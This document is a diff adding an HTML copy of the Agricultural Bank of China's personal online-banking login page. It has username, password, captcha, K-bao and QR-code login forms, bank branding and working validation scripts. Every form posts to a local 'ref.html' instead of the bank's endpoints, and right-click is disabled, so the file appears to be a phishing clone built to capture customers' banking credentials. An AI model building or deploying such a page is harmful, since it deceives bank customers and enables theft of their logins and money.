@@ -1,0 +1,719 @@
+<!DOCTYPE doctype html>
+<html lang="zh">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="ie=edge" http-equiv="x-ua-compatible"/>
+  <title>
+   中国农业银行个人网银登录入口
+  </title>
+  <meta content="中国农业银行，个人网银，用户名登录，证书登录" name="description"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <link href="/EbankSite/favicon.ico" rel="shortcut icon"/>
+  <link href="/EbankSite/apple-touch-icon.png" rel="apple-touch-icon"/>
+  <link href="/EbankSite/NetBank/static/css/normalize.css" rel="stylesheet"/>
+  <link href="/EbankSite/NetBank/static/css/main.css" rel="stylesheet"/>
+  <link href="/EbankSite/NetBank/static/css/login/login.css" rel="stylesheet"/>
+  <link href="/EbankSite/NetBank/static/css/libs/jquery.qtip.css" rel="stylesheet"/>
+  <script src="/EbankSite/NetBank/static/js/ilibs/writeObjectNew.js">
+  </script>
+  <script>
+   //为tab绑定的事件
+        function TabMethod() {
+            if ($('#m-verification-code').hasClass('hide')) {
+                document.getElementById("logo").focus();
+            } else {
+                document.getElementById("code").focus();
+            }
+        }
+
+        //为enter绑定的事件
+        function ReturnMethod() {
+            $('#logo')[0].click();
+        }
+
+        function ReturnMethod1() {
+            $('#m-kbbtn')[0].click();
+        }
+        var qr = {
+            qrcodeOpen : "1",
+            pathData: "/EbankSite/NetBank/static/img",
+            getPlattype: function () {
+                return password.GetOsType();
+            },
+            getMacInfo: function () {
+                return password.GetMachineCode('powerpass_ie', '636403006725808502');
+            }
+        };
+  </script>
+  <script event="EventTab" for="powerpass_ie" type="text/javascript">
+   TabMethod();
+  </script>
+  <script event="EventReturn" for="powerpass_ie" type="text/javascript">
+   ReturnMethod();
+  </script>
+  <script event="EventReturn" for="powerpass_ie1" type="text/javascript">
+   ReturnMethod1();
+  </script>
+ </head>
+ <body onload="$.checkCsp();">
+  <!--[if lt IE 8]>
+    <p class="browserupgrade">您正在使用<strong>过时的</strong> 浏览器. 请点击<a href="https://support.microsoft.com/zh-cn/help/17621/internet-explorer-downloads" target="_blank">升级</a>您的浏览器以提高体验。<a class="warningclose">X</a></p>
+<![endif]-->
+  <p class="loginTip hidden" id="favoriteTip">
+   尊敬的客户，我行已推出新版网上银行服务。请您在此页登录使用，以享受我行全新的网上银行服务。
+   <a class="tipClose">
+    X
+   </a>
+  </p>
+  <div class="g-box">
+   <div class="g-mask hidden" id="g-mask">
+    <div class="m-pointer" id="m-pointer">
+    </div>
+    <div class="m-kbsize" id="m-kbsize">
+    </div>
+    <div class="m-iknow" id="m-iknow">
+    </div>
+   </div>
+   <div class="g-top">
+   </div>
+   <div class="g-search">
+    <div class="m-cearchcenter">
+     <ul class="m-language">
+      <!-- <li>
+                <a href="javascript:;">繁体</a>
+            </li>
+            <li class="m-line"></li>
+            <li>
+                <a href="javascript:;">English</a>
+            </li>-->
+      <li>
+       <a href="http://www.abchina.com">
+        网站首页
+       </a>
+      </li>
+      <li class="m-line">
+      </li>
+      <li>
+       <a href="http://app.abchina.com/branch/">
+        网点查询
+       </a>
+      </li>
+     </ul>
+     <div class="m-crux">
+      <form action="ref.html" id="searchForm" method="post" target="_self">
+       <input class="m-txt" id="" name="keyword" placeholder="搜索关键词" type="text" value=""/>
+       <input class="m-btn" id="" name="SearchBtn" onclick=" searchForm.submit(); " type="button" value=" "/>
+      </form>
+     </div>
+    </div>
+   </div>
+   <div class="g-logo">
+    <div class="g-logo-center">
+     <div class="m-logo">
+      <a href="http://www.abchina.com">
+       <img alt="农业银行" src="/EbankSite/NetBank/static/img/logo.png" width="198"/>
+      </a>
+     </div>
+     <div class="m-logo-line">
+     </div>
+     <p class="m-logo-p">
+      个人网上银行
+     </p>
+    </div>
+   </div>
+   <div class="m-land">
+    <div class="m-land-center">
+     <div class="m-login-dialog m-userName-logon" id="commonLogin" style="height:350px;">
+      <div class="m-uesrland">
+       <div class="m-login-link">
+        <a class="m-login-userNameLink m-login-linked" id="kBaobtn">
+         用户名登录
+        </a>
+       </div>
+       <div class="m-login-link">
+        <a class="m-login-kbaoLink" id="userNamebtn">
+         K宝登录
+        </a>
+       </div>
+      </div>
+      <div class="m-login-linked-split">
+      </div>
+      <div class="m-login-split">
+      </div>
+      <div class="hidden" id="kBaoLogin">
+       <div class="m-Kbinsert" id="m-keyShow">
+        <div class="m-Kbinsertimg" id="m-KbinsertLogon">
+        </div>
+        <p id="cspName">
+         请插入K宝
+        </p>
+       </div>
+       <form action="ref.html" class="m-kbform" id="logonForm" method="post" name="logonForm">
+        <div class="m-Kbinsert-first" id="m-firstKeyShow" style="display: none;">
+         <div class="m-Kbinsertimg-first" id="m-KbinsertLogon-first">
+         </div>
+         <p id="cspName_first">
+         </p>
+        </div>
+        <div class="m-kbborder" id="PowerEnterDiv">
+         <script>
+          password.WritePassObjectLogin('powerpass_ie1', { randomText: "DDFC4DD2590585F39DB37FFFFBE6A54C", "borderColor": "#ffffff", "width": "250", "promptText": " 请输入K宝密码" });
+         </script>
+        </div>
+        <a class="m-kbbtn" href="###" id="m-kbbtn">
+         登  录
+        </a>
+        <input name="MachineCode" type="hidden" value=""/>
+        <input name="MachineInfo" type="hidden" value=""/>
+        <input name="plattype" type="hidden"/>
+        <input name="platRandom" type="hidden" value="DDFC4DD2590585F39DB37FFFFBE6A54C"/>
+       </form>
+       <div class="logon-error" style="height: auto; padding: 0 20px;" title="">
+       </div>
+       <a class="m-kba" href="http://ebhelper.abchina.com/ebhelper/ebhelper.exe" id="checkKey" title="不能登录网银？安装网银助手试试！">
+        网银助手
+       </a>
+       <img class="mobile-scan-intro hidden" src="/EbankSite/NetBank/static/img/login/mobile-scan-intro.png"/>
+      </div>
+      <div id="userNameLogin">
+       <form action="ref.html" class="m-uesrform" id="userNameForm" method="post" name="userNameForm">
+        <div class="m-uesrtxtbox" id="userDiv">
+         <div class="m-uesrtxtimg">
+         </div>
+         <input autocomplete="off" class="m-uesrtxt" id="username" name="username" placeholder="用户名/卡号/身份证号/手机号" style="ime-mode: inactive" title="只能由英文字母、数字、汉字或下划线“_”组成" type="text"/>
+        </div>
+        <div class="m-uesrpassbox">
+         <div id="PowerEnterDiv_userName" style="display: inline; margin-left: 10px;">
+          <script>
+           password.WritePassObjectOrg("powerpass_ie", { "randomText": "DDFC4DD2590585F39DB37FFFFBE6A54C", "softkbdType": 0, "maxLength": "30", "minLength": "6", "accepts": "^[A-Za-z0-9-]*$", "width": "225", "height": "36", "borderColor": "#ffffff", "promptText": "请输入登录密码" }, 'powerpass_ie_dyn_Msg');
+          </script>
+         </div>
+        </div>
+        <div class="pwdError" id="powerpass_ie_dyn_Msg">
+        </div>
+        <div class="m-verification-code hide" id="m-verification-code">
+         <input autocomplete="off" class="m-codetxt" id="code" maxlength="4" name="code" placeholder="验证码" style="ime-mode: disabled" type="text"/>
+         <img alt="验证码" height="33" id="vCode" src="" width="83"/>
+         <span class="v-code-error" id="imgError">
+         </span>
+        </div>
+        <input class="m-uersbtn" id="logo" type="button" value="登  录"/>
+        <div class="logon-error" style="display: none;" title="">
+        </div>
+        <input name="EntranceType" type="hidden" value="Common"/>
+        <input name="abc_formId" type="hidden" value="8967"/>
+        <input id="picCode" name="picCode" type="hidden"/>
+        <input name="MachineCode" type="hidden" value=""/>
+        <input name="MachineInfo" type="hidden" value=""/>
+        <input name="token" type="hidden" value=""/>
+        <input name="plattype" type="hidden"/>
+        <input name="pwdField" type="hidden"/>
+        <input name="pwdFieldKeys" type="hidden"/>
+       </form>
+       <ul class="m-uesrforget">
+        <li>
+         <a href="SelfHelpCheckCustInfoInitAct.do">
+          自助注册
+         </a>
+        </li>
+        <li class="m-uesrforgetline">
+        </li>
+        <li>
+         <a href="SelfHelpCheckCustInfoResetInitAct.do">
+          忘记密码
+         </a>
+        </li>
+       </ul>
+       <img class="mobile-scan-intro hidden" src="/EbankSite/NetBank/static/img/login/mobile-scan-intro.png"/>
+      </div>
+     </div>
+     <div class="m-login-dialog m-userName-logon hidden" id="qrcodeLogin" style="height:350px;text-align:center;overflow:hidden;">
+      <div class="m-login-qrtitle">
+       手机扫码，安全登录
+      </div>
+      <div class="m-login-qrborder">
+       <img alt="加载中..." data-first="1" height="150" id="qrcode" src="" width="150"/>
+       <div class="m-login-qrmask hidden" id="qrcodeMask">
+       </div>
+       <div class="m-login-qrmask-info hidden" id="qrcodeInfo">
+       </div>
+      </div>
+      <div class="m-qrcode-helper">
+       <img class="m-qrcode-helpimg" height="30" src="/EbankSite/NetBank/static/img/login/scan.png" width="30"/>
+       <span class="m-qrcode-helptext" style="line-height:1em;">
+        打开掌上银行
+        <br/>
+        扫描二维码
+       </span>
+      </div>
+      <div>
+       <a class="scan-helper" style="text-decoration:none;">
+        使用帮助
+       </a>
+       <span class="m-login-qrhelp-split">
+        |
+       </span>
+       <a href="http://www.abchina.com/cn/EBanking/Personal/Pocketbanking/" style="text-decoration:none;" target="_blank">
+        下载掌上银行
+       </a>
+      </div>
+      <form action="ref.html" id="qrForm" method="post" name="qrForm">
+       <input name="pidReq" type="hidden"/>
+       <input name="ticketReq" type="hidden"/>
+       <input name="codeIdReq" type="hidden"/>
+       <input name="businessTypeReq" type="hidden"/>
+       <input name="MachineCode" type="hidden" value=""/>
+       <input name="MachineInfo" type="hidden" value=""/>
+       <input name="plattype" type="hidden"/>
+      </form>
+      <img alt="qrcode-help" class="m-mobile-scan" src="/EbankSite/NetBank/static/img/login/mobile-scan.png" width="250"/>
+     </div>
+     <a class="m-uesrrightcorner hidden" href="###" id="loginChange" title="切换到二维码登录">
+      <img class="m-corner" id="corner" src="/EbankSite/NetBank/static/img/login/corner.png"/>
+     </a>
+    </div>
+   </div>
+   <div class="m-servicecentre">
+    <div class="m-servicecentre-center">
+     <div class="m-servicecentre-title">
+      <div class="m-leftspot">
+      </div>
+      <div class="m-core">
+       服务中心
+      </div>
+      <div class="m-rightspot">
+      </div>
+     </div>
+     <div class="m-important-link">
+      <dl class="m-certificate-download">
+       <dt>
+        <a href="http://www.abchina.com/cn/wydl/grwydl/zsgx/ckzsyxq/">
+        </a>
+       </dt>
+       <dd>
+        <a href="http://www.abchina.com/cn/wydl/grwydl/zsgx/ckzsyxq/">
+         证书下载
+        </a>
+       </dd>
+      </dl>
+      <dl class="m-toopen">
+       <dt>
+        <a href="http://www.abchina.com/cn/EBanking/Personal/Personalonlinebanking/">
+        </a>
+       </dt>
+       <dd>
+        <a href="http://www.abchina.com/cn/EBanking/Personal/Personalonlinebanking/">
+         如何开通网银
+        </a>
+       </dd>
+      </dl>
+      <dl class="m-kbfirst-landing">
+       <dt>
+        <a href="http://www.abchina.com/cn/wydl/grwydl/kbzs/kbdlzsdyb/#step1">
+        </a>
+       </dt>
+       <dd>
+        <a href="http://www.abchina.com/cn/wydl/grwydl/kbzs/kbdlzsdyb/#step1">
+         K宝首次登录
+        </a>
+       </dd>
+      </dl>
+      <dl class="m-klfirst-landing">
+       <dt>
+        <a href="http://www.abchina.com/cn/wydl/grwydl/klzs/klzsdyb/">
+        </a>
+       </dt>
+       <dd>
+        <a href="http://www.abchina.com/cn/wydl/grwydl/klzs/klzsdyb/">
+         K令首次登录
+        </a>
+       </dd>
+      </dl>
+      <dl class="m-problem">
+       <dt>
+        <a href="http://app.abchina.com/Kb/Category/19/2?pn=1&amp;m=1">
+        </a>
+       </dt>
+       <dd>
+        <a href="http://app.abchina.com/Kb/Category/19/2?pn=1&amp;m=1">
+         常见问题
+        </a>
+       </dd>
+      </dl>
+     </div>
+    </div>
+   </div>
+   <div class="g-end">
+    <div class="m-end" id="footer">
+     <ul class="m-endnav">
+      <li class="m-endnavli">
+       <a href="https://www.95599.cn/cn/PublicPlate/documents/200911/t20091130_16583.htm" target="_blank">
+        网站声明
+       </a>
+      </li>
+      <li class="m-endline">
+      </li>
+      <li class="m-endnavli">
+       <a href="https://www.95599.cn/cn/PublicPlate/WebLink/websitemap/" target="_blank">
+        网站地图
+       </a>
+      </li>
+      <li class="m-endline">
+      </li>
+      <li class="m-endnavli">
+       <a href="https://www.95599.cn/cn/AboutABC/ContactUs/" target="_blank">
+        联系我们
+       </a>
+      </li>
+      <li class="m-endline">
+      </li>
+      <li class="m-endnavli">
+       <a href="https://www.95599.cn/cn/EBanking/CustomerServiceCenter/CustomerServiceCenter/default.htm">
+        客服热线：
+        <span>
+         95599
+        </span>
+       </a>
+      </li>
+     </ul>
+     <div class="m-sincerity">
+      <a href="https://credit.cecdc.com/CX20120927001787002018.html" id="A1" target="_blank">
+       <img height="32" src="/EbankSite/NetBank/static/img/SelfHelp/index_V3_cxwz.jpg" width="90"/>
+      </a>
+     </div>
+     <ul class="m-copyright">
+      <li>
+       中国农业银行版权所有
+      </li>
+      <li class="m-overline">
+      </li>
+      <li>
+       <a href="https://www.miibeian.gov.cn/" target="_blank">
+        京ICP备05049539
+       </a>
+      </li>
+     </ul>
+    </div>
+   </div>
+  </div>
+  <script src="/EbankSite/NetBank/static/js/libs/jquery-1.12.0.min.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/libs/placeholders.jquery.min.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/libs/jquery.validate.min.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/libs/messages_zh.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/libs/json2.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/ilibs/browerHelper.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/libs/jstorage.min.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/ilibs/dataHelper.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/ilibs/imageCodeVerify.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/ilibs/preRepeSubmit.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/ilibs/config.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/libs/jquery.qtip.min.js">
+  </script>
+  <script src="/EbankSite/NetBank/static/js/ilibs/qrcode.js">
+  </script>
+  <script>
+   function resizeWindow() {
+        //userNamebtn  kBaobtn
+        var target = '#userNamebtn';
+        if ($('userNamebtn').hasClass('hidden')) {
+            target = '#kBaobtn';
+        }
+        var left;
+        try {
+            left = $(target).offset().left;
+            if (left < 400) {
+                var element = $(target).get(0);
+                var x = 0;
+                while (element && !isNaN(element.offsetLeft) && !isNaN(element.offsetTop)) {
+                    x += element.offsetLeft;
+                    element = element.offsetParent;
+                }
+                left = x;
+            }
+        } catch (e) {
+            left = 900;
+        }
+        $('#m-iknow').css('left', left - 370);
+        $('#m-pointer').css('left', left - 140);
+        $('#m-kbsize').css('left', left - 380);
+    }
+
+    $(function () {
+        if (qr.qrcodeOpen !== '0') {
+            $('#loginChange').removeClass('hidden');
+            $('.mobile-scan-intro').removeClass('hidden');
+        $('.scan-helper').on('mouseover', function () {
+                $('.m-mobile-scan').css('display', 'block').animate({ 'right': '32px' }, 200, 'linear');
+        }).on('mouseout', function () {
+            $('.m-mobile-scan').animate({ 'right': '-200px' }, 200, 'linear', function () { $(this).css('display', 'none'); });
+        });
+            var scanIntroTimer = setTimeout(function () {
+                $('.mobile-scan-intro').fadeOut();
+            }, 10000);
+        }
+        var loginMacType = '';
+        if (loginMacType === '0') {
+            $('#favoriteTip').removeClass('hidden');
+            $('#favoriteTip a.tipClose').on('click', function() {
+                $('#favoriteTip').addClass("hide");
+            });
+        }
+        $('#loginChange').click(function () {
+            if ($('#corner').hasClass('qr')) {
+                //切换到用户名K宝登录
+                $('#corner').animate({ 'left': '-70px', 'top': '0' }, 200, 'linear');
+                $('#corner').removeClass('qr');
+                $('#qrcodeLogin').addClass('hidden');
+                if ($.os === "macintosh") {
+                    $('#PowerEnterDiv_userName').css('height', '38px');
+                    $('#PowerEnterDiv').css('height', '38px');
+                }
+                else {
+                    $('#commonLogin').removeClass('hidden');
+                }            
+                $('#loginChange').attr('title', '切换到二维码登录');
+            }
+            else {
+                //屏蔽Chrome和未安装控件的Browser
+                if (typeof ($.browser.chrome) !== 'undefined' && $.browser.chrome) {
+                    alert('暂不支持该版本浏览器！');
+                }
+                else if (typeof (password) !== 'undefined' && typeof (password.IsInstalled) !== 'undefined' && password.IsInstalled === true) {
+                    //切换到二维码登录
+                    $('#corner').animate({ 'left': '0', 'top': '-70px' }, 200, 'linear');
+                    $('#corner').addClass('qr');
+                    if ($.os === "macintosh" || $.browser.firefox > 0) {
+                        $('#PowerEnterDiv_userName').css('height', '0');
+                        $('#PowerEnterDiv').css('height', '0');
+                    }
+                    else {
+                        $('#commonLogin').addClass('hidden');
+                    }
+                    $('#qrcodeLogin').removeClass('hidden');
+                    $('#loginChange').attr('title', '切换到用户名或K宝登录');
+                    if ($('#qrcode').attr('data-first') === '1') {
+                        var qrObj = { channel: 'MobileBank', businessType: 'scanlogin', interval: 3000 };
+                        var qrOptions = { width: 200, height: 200, logo: 'NetBank\\static\\img\\ABClogo_white.png' };
+                        var QRLogin = new qrCode(qrObj);
+                        QRLogin.setOptions(qrOptions);
+                        QRLogin.start();
+                        $('#qrcode').attr('data-first', '0');
+                    }               
+                }
+                else {
+                    alert('请下载最新的安全控件！');
+                }    
+            }
+        });
+        $(document).bind('contextmenu', function(event) {
+            if (event.preventDefault) event.preventDefault();
+            else event.returnValue = false;
+        });
+        resizeWindow();
+        $(window).resize(function() {
+            resizeWindow();
+        });
+        //$.jStorage.deleteKey('abc_tipShielKnown');
+        var isKnown = '1'; // $.jStorage.get('abc_tipShielKnown');
+        if (isKnown !== '1') {
+            $('#PowerEnterDiv_userName').addClass('invisible');
+            $('#PowerEnterDiv').addClass('invisible');
+            $('#g-mask').removeClass('hidden');
+            $('#m-iknow').on('click', function() {
+                $('#g-mask').addClass('hidden');
+                $('#PowerEnterDiv_userName').removeClass('invisible');
+                $('#PowerEnterDiv').removeClass('invisible');
+                $.jStorage.set('abc_tipShielKnown', '1', { TTL: 31536000000 });
+                if ($.os === "macintosh") {
+                    $("#userNamebtn").qtip({
+                        content: {
+                            text: '苹果电脑不支持K宝使用'
+                        },
+                        show: 'click',
+                        hide: 'unfocus'
+                    });
+                } else {
+                    $("#userNamebtn").on("click", function() {
+                        $("#kBaoLogin").removeClass("hidden");
+                        $("#userNameLogin").addClass("hidden");
+                        $(this).addClass("m-login-linked");
+                        $('.m-login-linked-split').animate({ 'margin-left': '154px' }, 200);
+                        $("#kBaobtn").removeClass("m-login-linked");
+                    });
+                }
+            });
+        }
+        if ($('.logon-error').text() !== '') {
+            $('.logon-error').css('display', '');
+        }
+        $("#kBaobtn").on("click", function () {
+            $("#userNameLogin").removeClass("hidden");
+            $("#kBaoLogin").addClass("hidden");
+            $(this).addClass("m-login-linked");
+            $('.m-login-linked-split').animate({ 'margin-left': '24px' }, 200);
+            $("#userNamebtn").removeClass("m-login-linked");
+        });
+        if ('false' === 'false' && isKnown === '1') {
+            if ($.os === "macintosh") {
+                $("#userNamebtn").qtip({
+                    content: {
+                        text: '苹果电脑不支持K宝使用'
+                    },
+                    show: 'click',
+                    hide: 'unfocus'
+                });
+            } else {
+                $("#userNamebtn").on("click", function() {
+                    $("#kBaoLogin").removeClass("hidden");
+                    $("#userNameLogin").addClass("hidden");
+                    $(this).addClass("m-login-linked");
+                    $('.m-login-linked-split').animate({ 'margin-left': '154px' },200);
+                    $("#kBaobtn").removeClass("m-login-linked");
+                });
+            }
+        }
+        var isFirst = 'false';
+        if (isFirst !== "true") {
+            $('#vCode').attr('src', 'LogonImageCodeAct.do?r=' + $.random());
+            $('#m-verification-code').removeClass('hide');
+            //$('.m-userName-logon').css('top', '10px');
+        }
+        $('#vCode').click(function() {
+            $('#vCode').attr('src', 'LogonImageCodeAct.do?r=' + $.random());
+        });
+
+        $('#code').checkPicCode({ infoShow: "imgError", target: "picCode" });
+        var validator = $('#userNameForm').validate({
+            rules: {
+                username: {
+                    required: true,
+                    stringCheck: true,
+                    lengthRange: [1, 60],
+                    looseValidId18: true
+                },
+                code: { required: false }
+            },
+            messages: {
+                username: {
+                    required: "请输入用户名",
+                    stringCheck: "用户名包含不合法字符",
+                    lengthRange: "用户名长度不合法",
+                    looseValidId18: "请输入正确的18位身份证号"
+                }
+            },
+            onfocusout: function(e) {
+                $(e).valid();
+            },
+            onsubmit: false,
+            errorClass: 'error-block',
+            invalidHandler: function(form) {
+                $('#logo').preRepeSubmit("recover");
+            }
+        });
+
+        $('#code').keydown(function(e) {
+            if (e.keyCode === 13 && $('#code').checkPicCode('isPassed') === 'true') {
+                $('#logo')[0].click();
+            }
+        });
+        $('#logo').preRepeSubmit({ "beingText": "正在登录...", "recoverText": "登  录" });
+        $('#logo').click(function() {
+            setTimeout(function() {
+                var macInfo = password.GetMachineCode('powerpass_ie', '636403006725808502');
+                $('#userNameForm input[name="MachineCode"]').val(macInfo.machineCode);
+                $('#userNameForm input[name="MachineInfo"]').val(macInfo.machineInfo);
+                if (!validator.form()) return false;
+                if (isFirst !== "true" && $('#code').checkPicCode('isPassed') !== 'true') {
+                    $('#code').checkPicCode('showError');
+                    $('#logo').preRepeSubmit("recover");
+                    return false;
+                }
+                if (!password.DealWithPwd("userNameForm", '636403006725808502', 'powerpass_ie_dyn_Msg')) {
+                    document.getElementById("powerpass_ie").focus();
+                    $('#logo').preRepeSubmit("recover");
+                    return false;
+                }
+                $('#userNameForm').submit();
+            }, 10);
+        });
+
+        $.directLogon = function ()
+        {
+            document.getElementById("m-kbbtn").innerHTML = "正在登录...";
+            setTimeout(function () {
+                try {
+                    var macInfo = password.GetMachineCode('powerpass_ie', '636403006725808502');
+                    $('#logonForm input[name="MachineCode"]').val(macInfo.machineCode);
+                    $('#logonForm input[name="MachineInfo"]').val(macInfo.machineInfo);
+                    $('#logonForm input[name="plattype"]').val(password.GetOsType);
+                } catch (e) {
+                }
+                $("#logonForm").submit();
+            }, 10);
+        }
+
+        $.logon = function() {
+            document.getElementById("m-kbbtn").innerHTML = "正在登录...";
+            setTimeout(function() {
+                try {
+                    var macInfo = password.GetMachineCode('powerpass_ie', '636403006725808502');
+                    $('#logonForm input[name="MachineCode"]').val(macInfo.machineCode);
+                    $('#logonForm input[name="MachineInfo"]').val(macInfo.machineInfo);
+                    $('#logonForm input[name="plattype"]').val(password.GetOsType);
+                } catch (e) {
+                }
+                if (!password.VerifyCSPPin()) {
+                    document.getElementById("m-kbbtn").innerHTML = "登&nbsp;&nbsp;录";
+                    return false;
+                }
+                $("#logonForm").submit();
+            }, 10);
+        };
+        $('#m-kbbtn').on('click', $.logon);
+
+        var haveChanged = false;
+        $.checkCsp = function() {
+            password.GetCSPListLogin(function() {
+                function change() {
+                    if (!haveChanged) {
+                        haveChanged = true;
+                        $("#kBaoLogin").removeClass("hidden");
+                        $("#userNameLogin").addClass("hidden");
+                        $("#userNamebtn").addClass("m-login-linked");
+                        $('.m-login-linked-split').animate({ 'margin-left': '154px' }, 200);
+                        $("#kBaobtn").removeClass("m-login-linked");
+                    }
+                }
+                return change; 
+            }());
+            setTimeout($.checkCsp, 3000, null);
+        };
+
+    });
+  </script>
+  <script>
+   //    function bhCallback() {
+//        var action_id = "login";   //current page action id
+//        var elementID = document.getElementById("logo");
+//        addClickListenerToButtonById(elementID, "username", site_id, action_id, true);
+//        var elementID = document.getElementById("m-kbbtn");
+//        addClickListenerToButtonById(elementID, "username", site_id, action_id, true);
+//    }
+//    try {
+//        loadScript(bhCallback);
+//    } catch (e) {
+//    }
+  </script>
+ </body>
+</html>
